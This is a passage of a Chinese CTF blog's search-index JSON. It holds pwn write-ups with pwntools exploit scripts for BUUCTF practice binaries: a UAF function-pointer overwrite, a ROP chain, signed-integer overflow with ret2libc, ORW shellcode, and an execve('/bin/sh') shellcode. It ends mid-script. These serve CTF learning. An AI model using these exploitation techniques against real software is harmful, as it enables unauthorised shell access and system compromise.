或\nshellcode_64 = b\u0026#39;\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05\u0026#39; 效果对比 ","date":"2023年01月02日","permalink":"https://peterliuzhi.top/tricks/%E8%BE%83%E4%B8%BA%E7%AE%80%E7%9F%AD%E7%9A%84shellcode/","section":"tricks","summary":"The industrial landscape is already littered with remains of once successful companies that could not adapt their strategic vision to altered conditions of competition. — Ralph Abernathy 有些时候因为栈的原因，程序运行时会破坏shellcode，这时候可以加一堆ret来抬高栈，也可以","tags":["pwn"],"title":"较为简短的shellcode"},{"categories":["tricks","scripts"],"contents":" A true friend freely, advises justly, assists readily, adventures boldly, takes all patiently, defends courageously, and continues a friend unchangeably. — William C. Menninger\n使用方法 changelibc 程序文件名 ld名字 libc路径 ld名字和libc路径如果不想改变可以用0、$、?、:四个分隔符代替\n如果不输入ld名字和libc路径，程序会在中途暂停并询问，如果直接回车就代表不改变该项\n注意ld名字是路径+名字，而libc路径是路径，不要加上libc的名字（如./libc/libc.so.6，不要写./libc/libc.so.6，写./libc）\n脚本 #!/bin/bash if [[ \u0026#34;$*\u0026#34; =~ \u0026#34;--help\u0026#34; ]] || [[ \u0026#34;$*\u0026#34; =~ \u0026#34;-h\u0026#34; ]]; then echo \u0026#34;【用法】$(basename $0) 程序文件名 ld名字 libc路径\u0026#34; echo \u0026#34;ld名字和libc路径如果不想改变可以用0、$、?、:四个分隔符代替\u0026#34; echo \u0026#34;如果不输入ld名字和libc路径，程序会在中途暂停并询问，如果直接回车就代表不改变该项\u0026#34; echo \u0026#34;注意ld名字是路径+名字，而libc路径是路径，不要加上libc的名字（如./libc/libc.so.6，不要写./libc/libc.so.6，写./libc）\u0026#34; echo \u0026#34;By PeterLiu\u0026#34; exit 0 fi filename=$1 while [ -z $filename ]; do echo -n \u0026#34;请输入程序文件的路径：\u0026#34; read filename done ldname=`ldd $filename | grep ld | awk -F \u0026#39;=\u0026gt;\u0026#39; \u0026#39;{print $2}\u0026#39; | awk -F \u0026#39;(\u0026#39; \u0026#39;{print $1}\u0026#39; | awk \u0026#39;$1=$1\u0026#39;` libcname=`ldd $filename | grep libc | awk -F \u0026#39;=\u0026gt;\u0026#39; \u0026#39;{print $2}\u0026#39; | awk -F \u0026#39;(\u0026#39; \u0026#39;{print $1}\u0026#39; | awk \u0026#39;$1=$1\u0026#39;` tmp=\u0026#34;\u0026#34; if [ -z \u0026#34;$2\u0026#34; ]; then echo -n \u0026#34;请输入ld的路径+名字（直接回车以跳过）：\u0026#34; read tmp if [ -n tmp ]; then patchelf --set-interpreter $tmp $filename else echo \u0026#34;不改变原有libc！\u0026#34; fi else if [ \u0026#34;$2\u0026#34; == \u0026#34;0\u0026#34; ] || [ \u0026#34;$2\u0026#34; == \u0026#34;$\u0026#34; ] || [ \u0026#34;$2\u0026#34; == \u0026#34;?\u0026#34; ] || [ \u0026#34;$2\u0026#34; == \u0026#34;:\u0026#34; ]; then echo \u0026#34;不改变原有ld！\u0026#34; else patchelf --set-interpreter $2 $filename fi fi if [ -z \u0026#34;$3\u0026#34; ]; then echo -n \u0026#34;请输入libc的路径，没有名字（直接回车以跳过）：\u0026#34; read tmp if [ -n tmp ]; then patchelf --set-rpath $tmp $filename else echo \u0026#34;不改变原有libc！\u0026#34; fi else if [ \u0026#34;$3\u0026#34; == \u0026#34;0\u0026#34; ] || [ \u0026#34;$3\u0026#34; == \u0026#34;$\u0026#34; ] || [ \u0026#34;$3\u0026#34; == \u0026#34;?\u0026#34; ] || [ \u0026#34;$3\u0026#34; == \u0026#34;:\u0026#34; ]; then echo \u0026#34;不改变原有libc！\u0026#34; else patchelf --set-rpath $3 $filename fi fi ldd $filename ","date":"2023年01月02日","permalink":"https://peterliuzhi.top/tricks/patchelf%E6%9B%B4%E6%94%B9libc%E8%84%9A%E6%9C%AC/","section":"tricks","summary":"A true friend freely, advises justly, assists readily, adventures boldly, takes all patiently, defends courageously, and continues a friend unchangeably. — William C. Menninger 使用方法 changelibc 程序文件名 ld名字 libc路径 ld名字和libc路径如果不想改变可以用0、$、?、:四个分隔","tags":["pwn","patchelf"],"title":"patchelf更改libc脚本"},{"categories":["writeup"],"contents":" Courage is going from failure to failure without losing enthusiasm. — Winston Churchill\n原题链接\nchecksec查看程序架构 ida查看伪C代码 菜单堆题，只有三个功能，分配空间，释放空间，显示内容，无法在分配了空间后更改空间的内容，这意味着我们要在分配空间的时候就把payload放进去\nallocate 可以看到，分配的空间有两种类型可选：\n一种是字符串型，会分配第二块空间，同时这块空间的大小在0x400以下任选 一种是数字型，不会分配第二块空间，只会分配第一块大小为0xC的空间 同时，我们发现，释放空间和显示内容的函数是存放在第一次分配的空间中的，因此这个结构类似于：\nstruct chunk{ void* show; void* remove; void* content; //因为32位系统中int大小等于指针大小，所以这个content可以复用保存int } 那么我们的思路大概就是通过tcache bin的LIFO原则释放后再分配实现错位，控制两个函数指针后，再通过UAF二次释放chunk\nexp # 自动生成头部 from pwn import * from pwn import p64, p32, u32, u64, p8 from LibcSearcher import LibcSearcher import ctypes pss: bool = False fn: str = \u0026#34;./ciscn_2019_n_3\u0026#34; libc_name: str = \u0026#34;/lib/i386-linux-gnu/libc.so.6\u0026#34; port: str = \u0026#34;25949\u0026#34; if_32: bool = True if_debug: bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; b* 0x804899C c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) # 两个elf，注意libc的版本 m_elf = ELF(fn) libc = ELF(libc_name) def suclog(**kwargs): for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None, timeout: float = 0.05, no_show: bool = True) -\u0026gt; bytes: if until is not None: p.recvuntil(flat(until)) received = p.clean(timeout) if not no_show: info(f\u0026#34;received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.send(flat(content)) return received def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None, timeout: float = 0.05, no_show: bool = True) -\u0026gt; bytes: send_after_clean([content, p.newline], until, timeout, no_show) def interactive_after_clean(timeout: int = 0.05, no_show: bool = True): received = p.clean(timeout) if not no_show: info(f\u0026#34;received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.interactive() def c_val(value: int, c_type: string) -\u0026gt; bytes: type_dict = { \u0026#34;long\u0026#34;: ctypes.c_long, \u0026#34;longlong\u0026#34;: ctypes.c_longlong, \u0026#34;ulong\u0026#34;: ctypes.c_ulong, \u0026#34;ulonglong\u0026#34;: ctypes.c_ulonglong, \u0026#34;int8\u0026#34;: ctypes.c_int8, \u0026#34;int16\u0026#34;: ctypes.c_int16, \u0026#34;int32\u0026#34;: ctypes.c_int32, \u0026#34;int64\u0026#34;: ctypes.c_int64, \u0026#34;uint8\u0026#34;: ctypes.c_uint8, \u0026#34;uint16\u0026#34;: ctypes.c_uint16, \u0026#34;uint32\u0026#34;: ctypes.c_uint32, \u0026#34;uint64\u0026#34;: ctypes.c_uint64, \u0026#34;int\u0026#34;: ctypes.c_int, \u0026#34;char\u0026#34;: ctypes.c_char, \u0026#34;bool\u0026#34;: ctypes.c_bool, \u0026#34;float\u0026#34;: ctypes.c_float, \u0026#34;double\u0026#34;: ctypes.c_double, \u0026#34;ushort\u0026#34;: ctypes.c_ushort, \u0026#34;byte\u0026#34;: ctypes.c_byte, \u0026#34;longdouble\u0026#34;: ctypes.c_longdouble, \u0026#34;size_t\u0026#34;: ctypes.c_size_t, \u0026#34;ssize_t\u0026#34;: ctypes.c_ssize_t, \u0026#34;ubyte\u0026#34;: ctypes.c_ubyte } try: return bytes(str(type_dict[c_type](value).value), encoding=\u0026#34;UTF-8\u0026#34;) except: try: return bytes(str(eval(f\u0026#34;ctypes.c_{c_type}(value).value\u0026#34;)), encoding=\u0026#34;UTF-8\u0026#34;) except: error(f\u0026#34;无法转换{value}或不存在类型{c_type}\u0026#34;) def load_libc(libc_name: str, *args, **kwargs) -\u0026gt; ctypes.CDLL: return ctypes.CDLL(libc_name, args, kwargs) def recv_and_transform(prev_string: str = None, from_bytes: bool = True, is_canary: bool = False, bound: str = None) -\u0026gt; int: if prev_string is not None: p.recvuntil(flat(prev_string)) if bound is not None: bound = flat(bound) if from_bytes: if bound is not None: return ug(p.recvuntil(bound)[:-len(bound)]) if if_32: return ug(p.recv(4)) else: if is_canary: return ug(p.recv(7).rjust(8, b\u0026#34;\\x00\u0026#34;)) else: return ug(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) else: if bound is not None: return int(p.recvuntil(bound)[:-len(bound)], 16) else: if if_32: return int(p.recv(10), 16) else: if is_canary: return int(p.recv(18), 16) else: return int(p.recv(14), 16) def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;÷\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) ... def allocate(index: int, size: int, type: int, content: bytes) -\u0026gt; None: sendline_after_clean(b\u0026#34;1\u0026#34;) sendline_after_clean(str(index)) sendline_after_clean(str(type)) if type == 2: sendline_after_clean(str(size)) sendline_after_clean(content) def remove(index: int) -\u0026gt; None: sendline_after_clean(b\u0026#34;2\u0026#34;) sendline_after_clean(str(index)) def show(index: int): sendline_after_clean(b\u0026#34;3\u0026#34;) sendline_after_clean(str(index)) # def change(index: int, content: bytes) -\u0026gt; None: # sendline_after_clean(b\u0026#34;4\u0026#34;) # sendline_after_clean(str(index)) # sendline_after_clean(content) allocate(0, 0xC, 2, \u0026#34;0\u0026#34;) allocate(1, 0x80, 1, \u0026#34;1\u0026#34;) remove(0) remove(1) payload = flat([ \u0026#34;sh\\x00\\x00\u0026#34;, m_elf.plt[\u0026#39;system\u0026#39;] ]) allocate(2, 0xC, 2, payload) remove(0) interactive_after_clean() ","date":"2023年01月02日","permalink":"https://peterliuzhi.top/writeup/ciscn_2019_n_3/","section":"writeup","summary":"Courage is going from failure to failure without losing enthusiasm. — Winston Churchill 原题链接 checksec查看程序架构 ida查看伪C代码 菜单堆题，只有三个功能，分配空间，释放空间，显示内容，无法在分配了空间","tags":["pwn","LIFO错位","UAF","更改chunk内函数指针"],"title":"ciscn_2019_n_3"},{"categories":null,"contents":" Until you make peace with who you are, you will never be content with what you have. — Doris Mortman\n本栏目用于收集各种杂项随笔\n","date":"2022年12月29日","permalink":"https://peterliuzhi.top/posts/hello/","section":"posts","summary":"Until you make peace with who you are, you will never be content with what you have. — Doris Mortman 本栏目用于收集各种杂项随笔","tags":null,"title":"Hello"},{"categories":null,"contents":"","date":"2022年12月29日","permalink":"https://peterliuzhi.top/search.html/","section":"","summary":"","tags":null,"title":"搜索结果"},{"categories":["writeup"],"contents":" Sometimes being a friend means mastering the art of timing. There is a time for silence. A time to let go and allow people to hurl themselves into their own destiny. And a time to prepare to pick up the pieces when it\u0026rsquo;s all over. — Octavia E. Butler\n原题链接\nchecksec ida 解题思路很简单，先后调用win_function1、winfunction2、flag函数即可，重要的是rop链的顺序，32位系统比较杂乱\nexp # 自动生成头部 from pwn import * from pwn import p64, p32, u32, u64, p8 from LibcSearcher import LibcSearcher pss: bool = True fn: str = \u0026#34;./PicoCTF_2018_rop_chain\u0026#34; libc_name: str = \u0026#34;/home/ctf/share/share_files/security/buuctf_libc/libc-2.23_32.so\u0026#34; port: str = \u0026#34;28219\u0026#34; if_32: bool = True if_debug:bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; break main c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) # 两个elf，注意libc的版本 m_elf = ELF(fn) libc = ELF(libc_name) def suclog(**kwargs): for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def sendline_after_clean(content: bytes) -\u0026gt; None: p.clean() p.sendline(content) def interactive_after_clean() -\u0026gt; None: p.clean() p.interactive() #需要自行设定offset offset:int = 0x18 + 0x4 payload = flat([ m_elf.sym[\u0026#39;win_function1\u0026#39;], m_elf.sym[\u0026#39;win_function2\u0026#39;], m_elf.sym[\u0026#39;flag\u0026#39;], -1163220307, -559039827 ]) payload = flat({offset : payload}) sendline_after_clean(payload) interactive_after_clean() 调用win1，因为没有参数，所以不用安排栈 等到win1结束时，有一条ret指令，会将win2弹入EIP\n而win2是一个有参数的函数，为了获取栈中参数，32位系统的方法是，使用[ebp+8]作为第一个参数，而ebp的值如下图所示：\n所以参数和指令之间要隔开\nflag函数同理\n","date":"2022年12月29日","permalink":"https://peterliuzhi.top/writeup/32%E4%BD%8D%E7%B3%BB%E7%BB%9F%E4%BC%A0%E5%8F%82buuctf-picoctf_2018_rop-chain/","section":"writeup","summary":"Sometimes being a friend means mastering the art of timing. There is a time for silence. A time to let go and allow people to hurl themselves into their own destiny. And a time to prepare to pick up the pieces when it\u0026rsquo;s all over. — Octavia E. Butler 原题链接 checksec ida 解题思路很简单，先后调用win_func","tags":["pwn","32位系统传参"],"title":"【32位系统传参】BUUCTF picoctf_2018_rop chain"},{"categories":["writeup"],"contents":" Follow effective action with quiet reflection. From the quiet reflection will come even more effective action. — Peter Drucker\n原题链接\nchecksec查看程序架构 ida查看程序伪代码 构建exp 符号位溢出 ret2libc 完整exp checksec查看程序架构 $ checksec --file ./pwn2_sctf_2016 [*] \u0026#39;/home/peterl/security/workspace/pwn2_sctf_2016/pwn2_sctf_2016\u0026#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) ida查看程序伪代码 我们发现第一次输入的数字决定了第二次输入的字符个数，但是必须小于32，而我们查看过栈情况后发现32个字符是不够的\n然后我们发现get_n的第二个参数的类型为unsigned int：\n那么我们可以考虑符号位漏洞\n构建exp 符号位溢出 我们知道，在计算机中负数是由补码机制表示的 （还有另一种不流行的表示方法，就是把第一位作为符号位，1表示负，0表示正，剩下的位表示数字的绝对值，但这样会产生-0和+0两个0），也就是说，原本如果不考虑负数，我们可以表示0~0xffffffff的正数，但是现在我们把它对半分，用后面那一节表示负数，那么这个数轴就变成了：\n0x80000000 ~ 0xffffffff 0 0x1 ~ 0x7fffffff $-2^{31}$ ~ $-1$ $0$ $1$ ~ $2^{31}-1$ 但是如果我们在C语言中进行数字的比较时，我们是比较的它们逻辑上的值，也就是-1 \u0026lt; 32，尽管-1在计算机内部的数值是大于32的（因为负数实际的值一定是大于等于0x80000000的，所以负数的第一位一定是1，而正数的第一位一定是0，这样我们就可以通过第一位来判断数字的正负了）\n如果我们将-1强制转换为无符号整数，那么它负数的属性就消失了，它逻辑上就是$2^{32}-1$\n这种逻辑上的不一致就产生了符号位漏洞\nret2libc 这题最无语的是它提供了一个do_thing函数：\n我还以为是要用syscall做，浪费了好多时间找能改变eax、ebx、ecx、edx的gadget，结果找了一圈就是没有能改eax的，后来无奈只能用ret2libc做\n这个程序有printf函数，我们通过printf函数泄露基址就好了\n完整exp 需要注意的是，这题的libc在libcdatabase是搜不到的，因此用不了libcsearcher\n可以去BUUCTF的FQA专栏找libc的下载地址\nfrom pwn import * from pwn import p64, p32, u32, u64 # from LibcSearcher import LibcSearcher pss: bool = True fn: str = \u0026#34;./pwn2_sctf_2016\u0026#34; libc_name: str = \u0026#34;./libc-2.23.so\u0026#34; port: str = \u0026#34;\u0026#34; if_32: bool = True if_debug:bool = False pg = p32 if if_32 else p64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;b* 0x80485B7\u0026#34;) else: p = process(fn) m_elf = ELF(fn) libc = ELF(libc_name) p.clean() p.sendline(b\u0026#34;-1\u0026#34;) p.clean() payload = b\u0026#34;a\u0026#34;*(0x2C + 0x4) + pg(m_elf.plt[\u0026#39;printf\u0026#39;]) + pg(m_elf.sym[\u0026#39;vuln\u0026#39;]) + pg(m_elf.got[\u0026#39;printf\u0026#39;]) p.sendline(payload) p.recvuntil(b\u0026#39;\\n\u0026#39;) printf_addr = u32(p.recv(4)) success(hex(printf_addr)) base_addr = printf_addr - libc.sym[\u0026#39;printf\u0026#39;] system_addr: int = base_addr + libc.sym[\u0026#39;system\u0026#39;] exit_addr: int = base_addr + libc.sym[\u0026#39;exit\u0026#39;] bin_sh_addr: int = base_addr + next(libc.search(b\u0026#34;/bin/sh\u0026#34;)) success(hex(base_addr)) p.clean() p.sendline(b\u0026#34;-1\u0026#34;) p.clean() ret: int = 0x08048346 payload = b\u0026#34;a\u0026#34;*(0x2C + 0x4) + \\ pg(system_addr) + pg(exit_addr) + pg(bin_sh_addr) p.sendline(payload) p.clean() p.interactive() ","date":"2022年12月29日","permalink":"https://peterliuzhi.top/writeup/%E7%AC%A6%E5%8F%B7%E4%BD%8D%E6%BC%8F%E6%B4%9E+ret2libcpwn2_sctf_2016/","section":"writeup","summary":"Follow effective action with quiet reflection. From the quiet reflection will come even more effective action. — Peter Drucker 原题链接 checksec查看程序架构 ida查看程序伪代码 构建exp 符号位溢出 ret2libc 完整exp checksec查看程序","tags":["pwn","符号位漏洞","ret2libc"],"title":"【符号位漏洞+ret2libc】pwn2_sctf_2016"},{"categories":["writeup"],"contents":" Never mistake activity for achievement. — John Wooden\n原题链接\nexp # 自动生成头部 from pwn import * from pwn import p64, p32, u32, u64, p8 from LibcSearcher import LibcSearcher import ctypes pss: bool = True fn: str = \u0026#34;./orw\u0026#34; libc_name:str = \u0026#34;\u0026#34; port: str = \u0026#34;26851\u0026#34; if_32: bool = True if_debug:bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; b* 0x804858A c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) # 两个elf，注意libc的版本 m_elf = ELF(fn) # libc = ELF(libc_name) def suclog(**kwargs): for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = False) -\u0026gt; bytes: if until is not None: if not isinstance(until, bytes): until = bytes(until, encoding=\u0026#34;UTF-8\u0026#34;) p.recvuntil(until) received = p.clean(timeout) if not no_show: info(f\u0026#34;received:{received}\u0026#34;) if not isinstance(content, bytes): content = bytes(content, encoding=\u0026#34;UTF-8\u0026#34;) p.send(content) return received def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = False) -\u0026gt; bytes: if not isinstance(content, bytes): content = bytes(content, encoding=\u0026#34;UTF-8\u0026#34;) send_after_clean(content + p.newline, until, timeout, no_show) def interactive_after_clean(timeout:int = 0.05, no_show: bool = False): received = p.clean(timeout) if not no_show: info(f\u0026#34;received:{received}\u0026#34;) p.interactive() def c_val(value: int, c_type: string) -\u0026gt; bytes: type_dict = { \u0026#34;long\u0026#34;: ctypes.c_long, \u0026#34;longlong\u0026#34;: ctypes.c_longlong, \u0026#34;ulong\u0026#34;: ctypes.c_ulong, \u0026#34;ulonglong\u0026#34;: ctypes.c_ulonglong, \u0026#34;int8\u0026#34;: ctypes.c_int8, \u0026#34;int16\u0026#34;: ctypes.c_int16, \u0026#34;int32\u0026#34;: ctypes.c_int32, \u0026#34;int64\u0026#34;: ctypes.c_int64, \u0026#34;uint8\u0026#34;: ctypes.c_uint8, \u0026#34;uint16\u0026#34;: ctypes.c_uint16, \u0026#34;uint32\u0026#34;: ctypes.c_uint32, \u0026#34;uint64\u0026#34;: ctypes.c_uint64, \u0026#34;int\u0026#34;: ctypes.c_int, \u0026#34;char\u0026#34;: ctypes.c_char, \u0026#34;bool\u0026#34;: ctypes.c_bool, \u0026#34;float\u0026#34;: ctypes.c_float, \u0026#34;double\u0026#34;: ctypes.c_double, \u0026#34;ushort\u0026#34;: ctypes.c_ushort, \u0026#34;byte\u0026#34;: ctypes.c_byte, \u0026#34;longdouble\u0026#34;: ctypes.c_longdouble, \u0026#34;size_t\u0026#34;: ctypes.c_size_t, \u0026#34;ssize_t\u0026#34;: ctypes.c_ssize_t, \u0026#34;ubyte\u0026#34;: ctypes.c_ubyte } try: return bytes(str(type_dict[c_type](value).value), encoding=\u0026#34;UTF-8\u0026#34;) except: try: return bytes(str(eval(f\u0026#34;ctypes.c_{c_type}(value).value\u0026#34;)), encoding=\u0026#34;UTF-8\u0026#34;) except: error(f\u0026#34;无法转换{value}或不存在类型{c_type}\u0026#34;) def load_libc(libc_name: str, *args, **kwargs) -\u0026gt; ctypes.CDLL: return ctypes.CDLL(libc_name, args, kwargs) def recv_and_transform(prev_string: str = None, from_bytes: bool = True,\\ is_canary: bool = False, bound: str = None) -\u0026gt; int: if prev_string is not None: if isinstance(prev_string, str): prev_string = bytes(prev_string, encoding=\u0026#34;UTF-8\u0026#34;) p.recvuntil(prev_string) if bound is not None and isinstance(bound, str): bound = bytes(bound, encoding=\u0026#34;UTF-8\u0026#34;) if from_bytes: if bound is not None: return ug(p.recvuntil(bound)[:-len(bound)]) if if_32: return ug(p.recv(4)) else: if is_canary: return ug(p.recv(7).rjust(8, b\u0026#34;\\x00\u0026#34;)) else: return ug(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) else: if bound is not None: return int(p.recvuntil(bound)[:-len(bound)], 16) else: if if_32: return int(p.recv(10), 16) else: if is_canary: return int(p.recv(18), 16) else: return int(p.recv(14), 16) def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;÷\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) ... # 需要自行设定offset # 生成orw的shellcode payload = flat([ asm(shellcraft.open(\u0026#34;./flag\u0026#34;)), asm(shellcraft.read(\u0026#39;eax\u0026#39;, \u0026#39;esp\u0026#39;, 0xff)), asm(shellcraft.write(1, \u0026#39;esp\u0026#39;, 0xff)) ]) # payload = payload.ljust(0x30, b\u0026#34;\\x00\u0026#34;) + b\u0026#34;./flag\\x00\u0026#34; sendline_after_clean(payload, \u0026#34;Give my your shellcode:\u0026#34;) interactive_after_clean() 没啥好讲的，就是一个生成orw的shellcode的题目，记一下orw的shellcode的生成函数就好\n","date":"2022年12月29日","permalink":"https://peterliuzhi.top/writeup/%E7%94%9F%E6%88%90orw-shellcodebuuctf-pwnable_orw/","section":"writeup","summary":"Never mistake activity for achievement. — John Wooden 原题链接 exp # 自动生成头部 from pwn import * from pwn import p64, p32, u32, u64, p8 from LibcSearcher import LibcSearcher import ctypes pss: bool = True fn: str = \u0026#34;./orw\u0026#34; libc_name:str = \u0026#34;\u0026#34; port: str = \u0026#34;26851\u0026#34; if_32: bool = True if_debug:bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;,","tags":["pwn","生成ORW shellcode"],"title":"【生成ORW shellcode】BUUCTF pwnable_orw"},{"categories":["writeup"],"contents":" Our shared values define us more than our differences. And acknowledging those shared values can see us through our challenges today if we have the wisdom to trust in them again. — John McCain\n原题链接\n查看程序架构 ida伪代码 典型的C++语法，这里应该有两个类，Admin继承自User： 其中我们发现Admin::shell正是我们需要的后门函数： 那么我们只要想办法调用这个函数即可 整个程序有两个输入点： 只要密码正确，程序就会调用v8指向的函数 而v8又是什么呢？v8的值是v3的指针，这里就有一个致命漏洞，v2是一个栈指针而不是.bss节的指针。所以如果返回main函数后再调用其他函数，就可能把这个地址覆盖掉 我们看看汇编代码这个栈指针在哪里 看来这个v2在[rbp+var_18]处，而这个值，我们在read_password中是可以覆盖的 这样我们就可以将其覆盖为Admin::shell了\nexp # 自动生成头部 from pwn import * from pwn import p64, p32, u32, u64, p8 from LibcSearcher import LibcSearcher import ctypes pss: bool = True fn: str = \u0026#34;./login\u0026#34; libc_name:str = \u0026#34;\u0026#34; port: str = \u0026#34;25767\u0026#34; if_32: bool = False if_debug:bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; break main c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) # 两个elf，注意libc的版本 m_elf = ELF(fn) # libc = ELF(libc_name) def suclog(**kwargs): for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = False) -\u0026gt; bytes: if until is not None: p.recvuntil(flat(until)) received = p.clean(timeout) if not no_show: info(f\u0026#34;received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.send(flat(content)) return received def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = False) -\u0026gt; bytes: send_after_clean([content, p.newline], until, timeout, no_show) def interactive_after_clean(timeout:int = 0.05, no_show: bool = False): received = p.clean(timeout) if not no_show: info(f\u0026#34;received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.interactive() def c_val(value: int, c_type: string) -\u0026gt; bytes: type_dict = { \u0026#34;long\u0026#34;: ctypes.c_long, \u0026#34;longlong\u0026#34;: ctypes.c_longlong, \u0026#34;ulong\u0026#34;: ctypes.c_ulong, \u0026#34;ulonglong\u0026#34;: ctypes.c_ulonglong, \u0026#34;int8\u0026#34;: ctypes.c_int8, \u0026#34;int16\u0026#34;: ctypes.c_int16, \u0026#34;int32\u0026#34;: ctypes.c_int32, \u0026#34;int64\u0026#34;: ctypes.c_int64, \u0026#34;uint8\u0026#34;: ctypes.c_uint8, \u0026#34;uint16\u0026#34;: ctypes.c_uint16, \u0026#34;uint32\u0026#34;: ctypes.c_uint32, \u0026#34;uint64\u0026#34;: ctypes.c_uint64, \u0026#34;int\u0026#34;: ctypes.c_int, \u0026#34;char\u0026#34;: ctypes.c_char, \u0026#34;bool\u0026#34;: ctypes.c_bool, \u0026#34;float\u0026#34;: ctypes.c_float, \u0026#34;double\u0026#34;: ctypes.c_double, \u0026#34;ushort\u0026#34;: ctypes.c_ushort, \u0026#34;byte\u0026#34;: ctypes.c_byte, \u0026#34;longdouble\u0026#34;: 